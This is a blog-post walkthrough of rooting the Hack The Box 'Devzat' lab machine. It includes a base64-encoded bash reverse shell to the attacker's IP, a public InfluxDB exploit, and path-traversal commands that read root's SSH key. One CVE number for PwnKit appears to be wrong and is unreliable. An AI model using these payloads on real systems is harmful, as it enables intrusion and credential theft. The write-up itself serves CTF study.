@@ -1,0 +1,384 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Devzat - HTB // FoushGX</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Muhammed Foaad" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://foushgx.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Devzat - HTB"/>
+<meta name="twitter:description" content="Devzat - HTB Hello everyone, Todey will explain to you how i pwned &ldquo;Devzat&rdquo; Machine from HTB.   Introduction This is a great machine it&rsquo;s not easy at all and need you to focus in each step before execute. In this machine you will learn many new things:
+ RCE from parsing Json Data &ldquo;Deserialization&rdquo; Port Forwarding Source code review  [01] Recon  First I started with nmap to check open ports on the machine."/>
+
+    <meta property="og:title" content="Devzat - HTB" />
+<meta property="og:description" content="Devzat - HTB Hello everyone, Todey will explain to you how i pwned &ldquo;Devzat&rdquo; Machine from HTB.   Introduction This is a great machine it&rsquo;s not easy at all and need you to focus in each step before execute. In this machine you will learn many new things:
+ RCE from parsing Json Data &ldquo;Deserialization&rdquo; Port Forwarding Source code review  [01] Recon  First I started with nmap to check open ports on the machine." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://foushgx.github.io/htb/devzat/" />
+<meta property="article:published_time" content="2022-03-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-03-12T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://foushgx.github.io/"><img class="app-header-avatar" src="/Profile.jpg" alt="Muhammed Foaad" /></a>
+      <h1>FoushGX</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             <br> 
+          
+          <a class="app-header-menu-item" href="/about/">about</a>
+             <br> 
+          
+          <a class="app-header-menu-item" href="/htb/">Hack The Box</a>
+             <br> 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Jr.Penetration Tester | CTF Player</p>
+      <div class="app-header-social">
+        
+          <a href="https://facebook.com/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>Facebook</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>LinkedIn</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/foushgx" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Devzat - HTB</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 12, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          6 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://foushgx.github.io/tags/htb-medium/">HTB-Medium</a>
+              <a class="tag" href="https://foushgx.github.io/tags/walkthrough/">Walkthrough</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="devzat---htb">Devzat - HTB</h2>
+<p>Hello everyone,
+Todey will explain to you how i pwned &ldquo;Devzat&rdquo; Machine from HTB.
+<figure>
+    <img src="/Images/devzat/Pwned.png"/> 
+</figure>
+</p>
+<h3 id="introduction">Introduction</h3>
+<p>This is a great machine it&rsquo;s not easy at all and need you to focus in each step before execute.
+In this machine you will learn many new things:</p>
+<ul>
+<li>RCE from parsing Json Data &ldquo;Deserialization&rdquo;</li>
+<li>Port Forwarding</li>
+<li>Source code review</li>
+</ul>
+<h3 id="01-recon">[01] Recon</h3>
+<ul>
+<li>First I started with <code>nmap</code> to check open ports on the machine.
+by <code>nmap -sV 10.10.11.118</code> I got 4 ports open.
+<figure>
+    <img src="/Images/devzat/nmap.png"/> 
+</figure>
+</li>
+<li>Let&rsquo;s start with web port <code>80/tcp</code></li>
+</ul>
+<blockquote>
+<p><strong>Don&rsquo;t forget to add IP to /etc/hosts</strong></p>
+</blockquote>
+<ol>
+<li>By Check the domain <code>devzat.htb</code> i found it&rsquo;s only one page, but found a valuable Information.
+<figure>
+    <img src="/Images/devzat/Bot-conn.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>It show me an example of how to connect to port <code>8000/tcp</code></li>
+</ul>
+<ol start="2">
+<li>
+<p>Here Let&rsquo;s connect to port <code>8000</code> as we see on website.</p>
+<p><code>ssh -l test devzat.htb -p 8000</code>
+<figure>
+    <img src="/Images/devzat/BotCommands.png"/> 
+</figure>
+</p>
+</li>
+</ol>
+<ul>
+<li>I found that it&rsquo;s a chat bot with specific commands.</li>
+<li>tried to get RCE, Path Traversal, File Reading but no thing worked with this bot.</li>
+<li>So, I decided to let it running until i can get another solution for it.</li>
+</ul>
+<ol start="3">
+<li>Now, Let&rsquo;s back to website &hellip;. I tried to check for directories to see if there any hidden dirs.
+<figure>
+    <img src="/Images/devzat/dirsearch.png"/> 
+</figure>
+
+i got only those dirs and checked them, but no thing important in them.</li>
+<li>So, I decided to check if there any VHOSTS for this domain using <code>FFUF</code></li>
+</ol>
+<pre><code>ffuf -u http://devzat.htb/ -H &quot;Host: FUZZ.devzat.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -mc 200 -v
+</code></pre><ul>
+<li>And i got one xD <code>pets</code> , so Let&rsquo;s add to <code>/etc/hosts</code> too and try access it.
+<figure>
+    <img src="/Images/devzat/VHOST.png"/> 
+</figure>
+</li>
+</ul>
+<ol start="5">
+<li>I accessed the VHOST and it&rsquo;s like a <code>pet Inventory</code> with a form to add a new pet.
+<figure>
+    <img src="/Images/devzat/pets.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>I started to check for hidden dirs
+<figure>
+    <img src="/Images/devzat/petsDirs.png"/> 
+</figure>
+</li>
+<li>And, I found a <code>/.git</code> folder was public xD</li>
+<li>by using <code>wget -r http://pets.devzat.htb/.git/</code> we can download all the repo and check it locally.
+<figure>
+    <img src="/Images/devzat/gitDirs.png"/> 
+</figure>
+</li>
+<li>I Checked them but nothing important &amp; no source code.</li>
+</ul>
+<ol start="6">
+<li>Now, I checked next dir <code>/build</code> and found <code>main.js</code> file. started to check it.</li>
+</ol>
+<ul>
+<li>and found valuable informatios.
+<figure>
+    <img src="/Images/devzat/JSCode.png"/> 
+</figure>
+</li>
+<li>Found that this page send data as json &amp; deserializate it. So Let&rsquo;s Check it.</li>
+</ul>
+<h3 id="02-foot-hold">[02] Foot-hold</h3>
+<ol>
+<li>By checking the Form in <code>http://pets.devzat.htb</code> and tried to send data as json.
+<figure>
+    <img src="/Images/devzat/req.png"/> 
+</figure>
+
+i found that all data i sent didn&rsquo;t apper in response. So maybe it&rsquo;s a Blind ?!!!</li>
+<li>I made a python server on my machine, then tried to connect on it from the request.
+<figure>
+    <img src="/Images/devzat/blindRCE.png"/> 
+</figure>
+</li>
+</ol>
+<ul>
+<li>and it works !!!!! it&rsquo;s really an <code>Insecure Deserialization</code> Vuln.</li>
+<li>Now it&rsquo;s time to get a rev shell from machine by running our connection cmd.</li>
+</ul>
+<ol start="3">
+<li>After some tries for rev shell commands and all didn&rsquo;t work, I released that any special char will make this command failed <code>&gt; &amp; /</code>.</li>
+</ol>
+<ul>
+<li>To bypass this step i convert my command to b64 and send it then reverse it on the machine it self and run it.</li>
+</ul>
+<pre><code>payload -&gt; 
+echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE0LzQ0NDQgMD4mMQ | base64 -d | bash
+</code></pre><figure>
+    <img src="/Images/devzat/patShell.png"/> 
+</figure>
+
+<ul>
+<li>Now i&rsquo;m connected to machine as <code>patrick</code> but when checking <code>/home</code> dir i found another user which have a <code>user.txt</code> file.</li>
+</ul>
+<h3 id="03-patrick-recon">[03] Patrick Recon</h3>
+<ol>
+<li>So start to recon machine as <code>patrick</code> user to see permissions to this user and what i can do in the machine.</li>
+</ol>
+<ul>
+<li>First checked SUID, found nothing <code>for real i found pwnKit exploit but didn't use it, just for let machine be funny xD</code></li>
+<li>Then Checked for passwords and ssh keys, found that patrick have a ssh key.</li>
+<li>After some Enumerating in the machine i found some ports running Locally.
+<figure>
+    <img src="/Images/devzat/localPorts.png"/> 
+</figure>
+</li>
+<li>Here we have 2 options, first is to try to use them from terminal, second is to make a Port forwarding.</li>
+<li>First, i started to <code>curl</code> with each port to see <code>service</code> working on it.</li>
+<li>After checking all ports, i decided to connect to <code>8086</code> , <code>8443</code> because <code>5000</code> is the website i open before.</li>
+</ul>
+<ol start="2">
+<li>I started to make ssh port forwarding for port <code>8086</code></li>
+</ol>
+<ul>
+<li>using <code>ssh -i id_rsa -L 8086:127.0.0.1:8086 -N patrick@devzat.htb</code> will forwarding a port to my local port.
+<figure>
+    <img src="/Images/devzat/8086Forwarded.png"/> 
+</figure>
+</li>
+<li>Tried to connect from browser, but it give me not found. but it works.</li>
+<li>So, i Checked this with <code>nmap -sV</code> to know what service running on this port.
+<figure>
+    <img src="/Images/devzat/8086Service.png"/> 
+</figure>
+</li>
+<li>I found that there is a DB running on this port locally.</li>
+<li>By searching for exploit for this version of DB, i got one on <a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">Github</a></li>
+<li>So I Downloaded &amp; run it.
+<figure>
+    <img src="/Images/devzat/DB%20Conn.png"/> 
+</figure>
+</li>
+<li>Now i&rsquo;m connected to DB, This type of DB new for me so i searched for commands to see if there is a different from default databases command.</li>
+<li>Here from HackTrick i found some commands for this DB <a href="https://book.hacktricks.xyz/pentesting/8086-pentesting-influxdb">Link</a></li>
+<li>After checking for Tables with <code>show measurements</code>, then getting data from <code>user</code> table.
+<figure>
+    <img src="/Images/devzat/UserDump.png"/> 
+</figure>
+</li>
+<li>I got the password for <code>catherine</code> user which is another user in machine.</li>
+</ul>
+<h3 id="04-low-user-access">[04] Low User Access</h3>
+<ol>
+<li>I connected to the user from the shell i opened <code>su catherine</code> and provide passwd i got.
+<figure>
+    <img src="/Images/devzat/2ndUser.png"/> 
+</figure>
+</li>
+<li>Started to Enum the machine to see the privilage to this user.</li>
+</ol>
+<ul>
+<li>First i tried <code>sudo -l</code> but found that user not sudoer.</li>
+<li>Then, tried searching in <code>SUID</code> and nothing too.</li>
+<li>For cron tabs, Sudo version, Kernal version nothing important for all of them.</li>
+<li>Tried to search for passwd for root but nothing too.</li>
+<li>After some Enumerating i found folder <code>/var/backups</code> which contain backup code for <code>devzat</code>
+<figure>
+    <img src="/Images/devzat/Backups.png"/> 
+</figure>
+</li>
+<li>I running a python server on machine and transfer those 2 files to my machine.</li>
+</ul>
+<ol start="3">
+<li>Starting to Enum 2 folders, and both have same files. so what changed ?!!</li>
+</ol>
+<ul>
+<li>I used <code>diff</code> and running on same file from both folders to see difference between them.</li>
+<li>First, in file <code>commands.go</code> i found that one of them have a <code>file</code> command and have a <code>password</code> for something.
+<figure>
+    <img src="/Images/devzat/CodeReview1.png"/> 
+</figure>
+</li>
+<li>After reading code carefully i released that <code>/file</code> is reading files from the machine but need to get this password with each request.</li>
+<li>But, How can i connect to this one?!! i tried <code>/file</code> on port <code>8000</code> but give me error.</li>
+<li>In another file i found the connection code. xD
+<figure>
+    <img src="/Images/devzat/CodeReview2.png"/> 
+</figure>
+</li>
+<li>It running on Localhost on port <code>8443</code> , and another one running <code>8000</code> public which we connect on it.</li>
+</ul>
+<h3 id="05-privilage-escalation">[05] Privilage Escalation</h3>
+<ul>
+<li>So from the shell i already have i connected to the local port with the same command i found on website just changed IP to localhost and local port .
+<code>ssh -l test 127.0.0.1 -p 8443</code>
+<figure>
+    <img src="/Images/devzat/localBot.png"/> 
+</figure>
+</li>
+<li>Now it&rsquo;s connected successfully, Let&rsquo;s try <code>/file</code> command.
+<figure>
+    <img src="/Images/devzat/fileReadError.png"/> 
+</figure>
+</li>
+<li>I tried to read <code>/etc/passwd</code> but it give error and give me Path.</li>
+<li>So, what i need now is Path Traversal not more xD &hellip;</li>
+<li>By running <code>/file ../../etc/passwd CeilingCatStillAThingIn2021?</code> it will read the file successfully.</li>
+<li>We can read <code>../root.txt</code> very easy now.</li>
+</ul>
+<ol start="3">
+<li>But I tried to get full access as root, so i searched for ssh key.</li>
+</ol>
+<ul>
+<li>
+<p>by running <code>/file ../.ssh/id_rsa CeilingCatStillAThingIn2021?</code>
+<figure>
+    <img src="/Images/devzat/rootSSH.png"/> 
+</figure>
+
+whoops !!!! root have ssh key and i read it&hellip;</p>
+</li>
+<li>
+<p>Now, I can connect as Root with full access via <code>ssh</code>.
+<figure>
+    <img src="/Images/devzat/rootConn.png"/> 
+</figure>
+</p>
+</li>
+</ul>
+<h3 id="congrats-rooted">Congrats!!! Rooted</h3>
+<p>btw, you can get root with many ways:</p>
+<ol>
+<li>PwnKit <code>CVE-2021-4043</code></li>
+<li>Dirty Pipe <code>CVE-2022-0847</code></li>
+</ol>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
